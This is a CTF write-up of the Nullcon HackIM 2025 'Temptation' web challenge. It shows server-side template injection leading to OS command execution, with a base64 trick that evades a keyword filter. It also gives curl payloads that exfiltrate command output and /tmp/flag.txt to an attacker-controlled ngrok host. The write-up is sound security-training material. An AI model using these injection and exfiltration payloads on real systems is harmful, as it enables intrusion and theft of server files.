
# 🌐 Temptation


![Challenge Presentation](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/challenge_presentation.png "Challenge Presentation")

## 📊 Challenge Overview
>
>| Category | Details | Additional Info |
>|----------|---------|-----------------|
>| 🏆 Event | Nullcon Goa HackIM 2025 CTF | [Event Link](https://ctf.nullcon.net/challenges#Temptation-64) |
>| 🔰 Category | Web | 🌐 |
>| 💎 Points | 500 | Out of 500 total |
>| ⭐ Difficulty | 🟡 Medium | Personal Rating: 5/10 |
>| 👤 Author | @gehaxelt | [Profile]() |
>| 🎮 Solves (At the time of flag submission)| 83 | solve rate |
>| 📅 Date | 01-02-2025 | Nullcon Goa HackIM 2025 CTF |
>| 🦾 Solved By | mH4ck3r0n3 | Team: QnQSec |

## 📝 Challenge Information
> The attempted attempt to tempt the untempted into a tempting but contemptible scheme was an untempting temptation that exemplified not only contempt but also a preemptive exemption from any redemptive attempts. 
> http://52.59.124.14:5011

## 🎯 Challenge Files & Infrastructure

### Provided Files
>```yaml
>Files: None
>```

# 🔍 Initial Analysis

## First Steps
> Initially, the website appears as follows:
> 
> ![Site Presentation](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/site_presentation.png "Site Presentation")
>
> Inspecting the page source:
> 
> ![Source Page](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source.png "Source Page")
> 
> I found the route `/?source`, which was supposed to show me the server-side source code:
> 
> ![Source Path](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_path.png "Source Path")
> 
> But when visiting it, I received the same page as before from `/`. So, I tried passing the parameter `/?source=0` and got the source code:
> 
> ![Source Code](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_page.png "Source Code")
> 
> Indeed, as we can see from the source code, any GET request with the parameter `/?source=something` returns the source code of the page. It's also possible to make a POST request to the page passing a `temptation` parameter. If the `temptation` parameter contains `flag` or `FLAG` (and so on), since everything is converted to lowercase, an error message is returned. It then checks if the parameter we send equals `FLAG`, and if so, it returns the actual flag. Initially, I thought of some kind of character escape or encoding to bypass the first check and reach the second one to pass it. As the first step, I copied the source and created a file [:(far fa-file-archive fa-fw): app.py](/resources/NullCon-Goa-HackIM-CTF-2025/Temptation/app.py). I added a couple of print statements for debugging purposes to understand how everything works. It had dependencies, so I installed `web.py` and then started the app locally:
> 
> ```bash
> pip install web.py
> python3 app.py
> ```
> 
> ![App Execution](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/app.png "App Execution")
> 
> Next, I started making test requests using `curl` to test for a potential template injection with the parameter `temptation=\${injection}`:
> 
> ```bash
>  curl -X POST "http://0.0.0.0:8080/" --data-urlencode "temptation=\${chr(70)+chr(76)+chr(65)+chr(71)}"
> ```
> 
> I tried to bypass the check by sending `flag` composed of the conversion from decimal to text (ASCII) using Python's `chr()` function, since through the template injection I was able to execute Python. As we can see, once I send the request, it halts at the last `if` statement, which checks `str(temptation) == "FLAG"`.
> 
>  ![Curl 1](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl1.png "Curl 1")
>  
> With the debug prints I previously added to the code, I understood why it wasn't working. As we can see, it evaluates `"Your temptation is: FLAG" == "FLAG"`, and of course, this condition will never be true. So, I thought of using escape characters, also converted from decimal to ASCII using the `chr()` function. Invisible characters should not be recognized by the server. The first thing I tried to send was `temptation=\${chr(0)+chr(70)+chr(76)+chr(65)+chr(71)}`, where I added `chr(0)`, which represents the `\x00` (null character) string terminator, so it would stop before `FLAG` and only insert `FLAG` into the `temptation` variable. However, this didn't work. The second thing I tried was sending backspace characters, i.e., the character used to erase on a keyboard. By sending `chr(8)` (the backspace character in ASCII) before the characters forming the word `FLAG`, it would erase the unwanted part (`Your temptation is: `), bypassing the check and allowing the correct flag to pass.
>  
>  ```bash
>  curl -X POST "http://0.0.0.0:8080/" --data-urlencode "temptation=\${chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(70)+chr(76)+chr(65)+chr(71)}"
> ```
>
> ![Curl 2](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl2.png "Curl 2")
> 
> As we can see, however, the backspace character did not actually erase the text; instead, it literally replaced the text (much like in Vim's REPLACE mode). So, after trying a sequence of characters that would erase the line, and experimenting with other approaches, I realized that it wasn't the right path. I then tried to execute a command locally, such as `id`, using Python's `os` module:
> 
> ```bash
> curl -X POST "http://0.0.0.0:8080/" --data-urlencode "temptation=\${__import__('os').popen('id').read()}"
> ```
> ![Curl 3](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl3.png "Curl 3")
> 
> As we can see, the command actually gets executed, but in the end, it hits the last `if` statement and doesn't return the flag because it fails the check. From there, I attempted to get a reverse shell via netcat, but obviously, it would have to be installed on the server, and I wasn't sure about that. I then thought of using the classic reverse shell with `/dev/tcp` in Bash to establish a TCP connection, but that didn’t work either. So, I found my own way around it. Let's move on to the exploitation.
> 

## 🔬 Vulnerability Analysis
### Potential Vulnerabilities
>- [x] SSTI (Server Side Template Injection)

# 🎯 Solution Path

## Exploitation Steps
### Initial setup
> My idea was to redirect the contents of `/tmp/flag.txt` to my own web server by sending the flag in a request parameter. So the first thing I did was start a web server:
> ```bash
> ngrok http 8080
> ``` 
> Once I started the web server, I first tried with a local request by directing `curl` to my own server, exploiting the SSTI vulnerability.
>
>```bash
> curl -X POST "http://0.0.0.0:8080/" --data-urlencode "temptation=\${__import__('os').popen('curl https://c590-2-37-206-147.ngrok-free.app').read()}"
>```
>![Curl 4](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl4.png "Curl 4")
> 
> As we can see, the request arrives on ngrok. Now, it needs to be tested if the same happens when performing this process on the challenge server, not locally (since `curl` needs to be installed on the web server to make requests).
> 
> ```bash
> curl -X POST "http://52.59.124.14:5011/" --data-urlencode "temptation=\${__import__('os').popen('curl https://c590-2-37-206-147.ngrok-free.app').read()}"
>``` 
> ![Curl 5](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl5.png "Curl 5")
> 
> As we can see, it works, and `curl` is correctly installed on the web server. This allows us to redirect the request to our server. After a few tests locally, I was able to get the response of the `id` command execution from the remote challenge web server to my web server created with ngrok.
> 
> ```bash
> curl -X POST "http://52.59.124.14:5011/" --data-urlencode "temptation=\${__import__('os').popen('curl https://c590-2-37-206-147.ngrok-free.app?content=\$(id)').read()}"
> ``` 
> 
> Using `$(command)` in bash allows executing commands and printing the output inside strings. This is the result:
> 
> ![Curl 6](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl6.png "Curl 6") 
> 
> As we can see, I obtain the response on my web server, but let's check if the output of the `id` command executed on the web server is in the `content` request parameter. This can be done through the ngrok web interface at [http://127.0.0.1:4040](http://127.0.0.1:4040).
> 
> !['id' Execution](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/id.png "'id' Execution")
> 
> As we can see from the last request, the `content` parameter contains the value `uid=999(appuser)`, which is the user ID with which we executed the command. So it works! Now, we just need to proceed with the actual exploitation and read the `/tmp/flag.txt` file.
> 
### Exploitation
>For the exploitation, we can't send a direct request with `cat /tmp/flag.txt` because the server blocks the request before reaching the template injection part if it finds `flag` in the request. So, I thought of encoding the command in base64:
>  
>  ```bash
>  echo "cat /tmp/flag.txt" | base64
>  ```
>   ![Base64 Encode](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/base64_encode.png "Base64 Encode")
>
> Once the command is encoded, we can use a simple bash trick, the pipe `|`, to concatenate commands and execute the base64-decoded command on bash itself. We can do this by running `echo Y2F0IC90bXAvZmxhZy50eHQK | base64 -d | bash`. As we can see, this command executes `cat /tmp/flag.txt`:
> 
> ![Cat Flag](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/cat_flag.png "Cat Flag")
> 
> Once that's done, since we are sending a base64-encoded string in the request, the check won't block it because `"Y2F0IC90bXAvZmxhZy50eHQK" != "flag"`. However, once it reaches the web server, the actual command will be executed. I then construct the complete request with curl:
> 
> ```bash
> curl -X POST "http://52.59.124.14:5011/" --data-urlencode "temptation=\${__import__('os').popen('curl https://9791-2-37-206-147.ngrok-free.app?content=\$(echo Y2F0IC90bXAvZmxhZy50eHQK| base64 -d |bash)').read()}"
> ```
> ![Exploitation](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/exploitation.png "Exploitation")
> 
> And as we can see, the request reaches the `ngrok` web server. Now, we just need to check on the ngrok web interface to see if the output of the `cat /tmp/flag.txt` command (i.e., the actual flag) is in the `content` parameter. Another valid and much more elegant exploit, after speaking with a guy from my team, is the following:
> 
> ```bash
> curl http://52.59.124.14:5011/ --data "temptation=\${__import__('os').popen('curl -X POST https://your-server.com --data-binary @/etc/flag.txt').read()}"
> ```
>
### Flag capture
>  
>   ![Manual Flag](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/manual_flag.png "Manual Flag")
> (The flag does not display the `{}` brackets due to an encoding or decoding issue with ngrok. You just need to add one bracket at the end and one after `ENO` to recreate the flag pattern and have a valid flag.)

# 🛠️ Exploitation Process
## Approach
> The exploit I created is fully automated and performs the procedure described above. However, there are some prerequisites. First, ngrok needs to be started:
> 
> ```bash
> ngrok http 4444
> ```
>
> If necessary, the port in `exploit.py` should be changed to match the tunneling port of ngrok. After starting ngrok, take the tunneling link provided by ngrok and replace the link in the `request.py` script. At this point, you just need to run the exploit first, followed by the request, either in separate terminals or on the same terminal, possibly using tmux.
>
> ```bash
> python exploit.py
> python request.py
> ```
>
> `exploit.py` is a Python web server that runs locally, and with ngrok tunneling, it forwards the port. So once the request with the payload is sent, the response will first go to `ngrok` and then to the local Python server. Upon receiving the request, I extract the `content` parameter, format the flag by adding `{}` as mentioned earlier, and then print it:
> 
> - [:(far fa-file-archive fa-fw): Exploit](/resources/NullCon-Goa-HackIM-CTF-2025/Temptation/exploit.py)
> - [:(far fa-file-archive fa-fw): Request](/resources/NullCon-Goa-HackIM-CTF-2025/Temptation/request.py)

# 🚩 Flag Capture
>{{< admonition danger "Flag" >}}
{{< typeit tag=h4 >}}
ENO{T3M_Pl4T_3S_4r3_S3cUre!!}
{{< /typeit >}}
>{{< /admonition >}}
>
## Proof of Execution
> ![Automated Flag](/images/NullCon-Goa-HackIM-CTF-2025/Temptation/automated_flag.png "Automated Flag")
>*Screenshot of successful exploitation*

# 🔧 Tools Used
>| Tool | Purpose |
>|------|---------|
>| Python | Exploit |
>| Ngrok | Tunneling |

# 💡 Key Learnings
## New Knowledge
> I learned to exploit SSTI by passing a command and returning the output to my ngrok webserver.
## Skills Improved
>- [ ] Binary Exploitation
>- [ ] Reverse Engineering
>- [x] Web Exploitation
>- [ ] Cryptography
>- [ ] Forensics
>- [ ] OSINT
>- [ ] Miscellaneous

---
# 📊 Final Statistics
| Metric | Value | Notes |
|--------|--------|-------|
| Time to Solve | 01:30 | From start to flag |
| Global Ranking (At the time of flag submission)| 26/970 | Challenge ranking |
| Points Earned | 500 | Team contribution |

*Created: 01-02-2025 • Last Modified: 01-02-2025*
*Author: mH4ck3r0n3 • Team: QnQSec*
